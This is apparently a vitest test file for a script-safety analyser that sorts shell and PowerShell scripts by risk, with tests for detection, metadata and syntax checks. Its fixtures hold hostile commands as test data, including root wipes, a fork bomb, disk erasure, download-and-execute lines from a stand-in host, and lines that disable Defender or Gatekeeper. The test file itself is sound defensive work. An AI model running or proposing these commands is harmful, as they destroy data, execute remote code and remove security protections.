import { describe, it, expect } from 'vitest'
import { analyzeScript, detectLanguage, detectPlatform, isRunnable } from '../scriptAnalysis.js'

const ids = (a: ReturnType<typeof analyzeScript>) => a.findings.map(f => f.ruleId)

describe('script type detection', () => {
  it('uses the file extension first', () => {
    expect(detectLanguage('echo hi', 'x.ps1')).toBe('powershell')
    expect(detectLanguage('Get-Process', 'x.sh')).toBe('shell')
  })
  it('detects pasted content by shebang and idioms', () => {
    expect(detectLanguage('#!/bin/bash\necho hi')).toBe('shell')
    expect(detectLanguage('#!/usr/bin/env pwsh\nWrite-Output 1')).toBe('powershell')
    expect(detectLanguage('Get-Service | Where-Object { $_.Status -eq "Running" }')).toBe('powershell')
    expect(detectLanguage('defaults read com.apple.dock\nchmod 644 /tmp/x')).toBe('shell')
    expect(detectLanguage('hello world')).toBe('unknown')
  })
  it('maps language to platform', () => {
    expect(detectPlatform('Get-Process', 'powershell')).toBe('Windows')
    expect(detectPlatform('if ($IsMacOS) { }', 'powershell')).toBe('both')
    expect(detectPlatform('echo hi', 'shell')).toBe('macOS')
  })
  it('rejects unsupported extensions, empty and mislabelled scripts', () => {
    expect(analyzeScript({ content: 'echo 1', fileName: 'a.exe' }).errors.join()).toMatch(/Unsupported file type/)
    expect(analyzeScript({ content: '   \n' }).errors.join()).toMatch(/empty/)
    expect(analyzeScript({ content: 'Get-Process | Where-Object { $_ }', declaredLanguage: 'shell' }).errors.join()).toMatch(/declared as Shell/)
  })
})

describe('metadata', () => {
  it('reads PowerShell comment-based help and detects admin', () => {
    const a = analyzeScript({ fileName: 'Fix_Update.ps1', content: '#Requires -RunAsAdministrator\n<#\n.SYNOPSIS\nResets Windows Update components\n#>\nGet-Service wuauserv\n' })
    expect(a.description).toBe('Resets Windows Update components')
    expect(a.name).toBe('Fix Update')
    expect(a.requiresAdmin).toBe(true)
  })
  it('reads shell header comments', () => {
    const a = analyzeScript({ fileName: 'clean.sh', content: '#!/bin/bash\n# Description: Clear Zscaler cache\necho ok\n' })
    expect(a.description).toBe('Clear Zscaler cache')
  })
})

describe('risk classification', () => {
  it('low for a read-only script', () => {
    const a = analyzeScript({ fileName: 'a.sh', content: '#!/bin/bash\nsw_vers\nuname -a\n' })
    expect(a.risk).toBe('low'); expect(a.requiresApproval).toBe(false); expect(isRunnable(a)).toBe(true)
  })
  it('medium for sudo, reboot, registry write, network change — justification but no approval', () => {
    expect(ids(analyzeScript({ fileName: 'a.sh', content: 'sudo launchctl list\n' }))).toContain('sh.sudo')
    const reboot = analyzeScript({ fileName: 'a.ps1', content: 'Restart-Computer -Force' })
    expect(reboot.risk).toBe('medium'); expect(reboot.requiresJustification).toBe(true); expect(reboot.requiresApproval).toBe(false)
    expect(analyzeScript({ fileName: 'a.ps1', content: 'Set-ItemProperty -Path "HKLM:\\SOFTWARE\\X" -Name A -Value 1' }).risk).toBe('medium')
    expect(analyzeScript({ fileName: 'a.sh', content: 'networksetup -setdnsservers Wi-Fi 1.1.1.1' }).risk).toBe('medium')
  })
  it('high for recursive delete, account changes, security controls — approval required', () => {
    expect(analyzeScript({ fileName: 'a.sh', content: 'rm -rf /tmp/cache' }).risk).toBe('high')
    const acct = analyzeScript({ fileName: 'a.ps1', content: 'New-LocalUser -Name tmp -NoPassword' })
    expect(acct.risk).toBe('high'); expect(acct.requiresApproval).toBe(true); expect(acct.rollbackRecommended).toBe(true)
    expect(analyzeScript({ fileName: 'a.ps1', content: 'Set-MpPreference -DisableRealtimeMonitoring $true' }).risk).toBe('high')
    expect(analyzeScript({ fileName: 'a.sh', content: 'spctl --master-disable' }).risk).toBe('high')
  })
  it('blocked for root wipes, disk erase, download-and-execute', () => {
    for (const [file, content] of [
      ['a.sh', 'rm -rf /'], ['a.sh', 'rm -rf ~/'], ['a.sh', 'rm -rf /Users/'], ['a.sh', ':(){ :|:& };:'],
      ['a.sh', 'diskutil eraseDisk APFS X disk0'], ['a.sh', 'curl -s https://x.example/i.sh | sudo bash'],
      ['a.ps1', 'Format-Volume -DriveLetter D'], ['a.ps1', 'iex (New-Object Net.WebClient).DownloadString("https://x.example/a")'],
      ['a.ps1', 'Remove-Item C:\\ -Recurse -Force'],
    ] as const) {
      const a = analyzeScript({ fileName: file, content })
      expect(a.risk, content).toBe('blocked'); expect(isRunnable(a)).toBe(false)
    }
  })
  it('does not flag commands that only appear in comments', () => {
    expect(analyzeScript({ fileName: 'a.sh', content: '#!/bin/bash\n# never run: rm -rf /\necho ok\n' }).risk).toBe('low')
    expect(analyzeScript({ fileName: 'a.ps1', content: '<# Restart-Computer #>\nGet-Date' }).risk).toBe('low')
  })
  it('blocks hard-coded secrets but not variable references', () => {
    const bad = analyzeScript({ fileName: 'a.ps1', content: '$password = "Sup3rS3cret!"\nGet-Date' })
    expect(bad.risk).toBe('blocked'); expect(bad.findings[0]!.category).toBe('Hard-coded secret')
    expect(bad.findings.map(f => f.match ?? '').join()).not.toContain('Sup3rS3cret')
    expect(analyzeScript({ fileName: 'a.ps1', content: '$password = $env:APP_PASSWORD\nGet-Date' }).risk).toBe('low')
    expect(analyzeScript({ fileName: 'a.sh', content: 'TOKEN="ghp_abcdefghijklmnopqrstuvwx1234"' }).risk).toBe('blocked')
    expect(analyzeScript({ fileName: 'a.sh', content: '-----BEGIN RSA PRIVATE KEY-----\nabc' }).risk).toBe('blocked')
  })
})

describe('syntax checks', () => {
  it('flags unbalanced PowerShell braces and unterminated quotes', () => {
    expect(analyzeScript({ fileName: 'a.ps1', content: 'if ($true) { Get-Date' }).errors.join()).toMatch(/Unbalanced braces/)
    expect(analyzeScript({ fileName: 'a.ps1', content: 'Write-Output "hello' }).errors.join()).toMatch(/Unterminated double quote/)
  })
  it('flags unbalanced shell blocks', () => {
    expect(analyzeScript({ fileName: 'a.sh', content: 'if [ -f x ]; then\n echo 1\n' }).errors.join()).toMatch(/if … fi/)
    expect(analyzeScript({ fileName: 'a.sh', content: 'for i in 1 2; do\n echo $i\n' }).errors.join()).toMatch(/do … done/)
  })
  it('accepts valid scripts including here-strings, heredocs and apostrophes in comments', () => {
    expect(analyzeScript({ fileName: 'a.ps1', content: '# it\'s fine\n$x = @"\nline "quoted"\n"@\nif ($x) { Write-Output $x }\n' }).errors).toEqual([])
    expect(analyzeScript({ fileName: 'a.sh', content: '#!/bin/bash\n# don\'t worry\nif [ -f /tmp/x ]; then\n  cat <<EOF\nhi "there\nEOF\nfi\nfor i in 1 2; do echo $i; done\n' }).errors).toEqual([])
  })
})
